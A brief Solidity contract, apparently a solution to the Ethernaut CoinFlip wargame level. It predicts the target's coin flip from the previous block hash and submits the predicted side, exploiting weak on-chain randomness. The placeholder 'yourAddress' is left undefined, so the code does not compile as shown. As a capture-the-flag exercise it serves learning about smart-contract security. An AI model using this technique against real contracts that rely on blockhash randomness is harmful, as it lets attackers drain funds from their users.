// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface CoinFlip {
    function  flip(bool) external;
}

contract attackCoinFlip {
    
    CoinFlip public target;

    constructor() public {
        //Where yourAddress is the targeted address instance you get from Ethernaut
        target = CoinFlip(yourAddress);
    }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool side = coinFlip == 1 ? true : false;
    target.flip(side);
  }
  
  receive() external payable {}
}
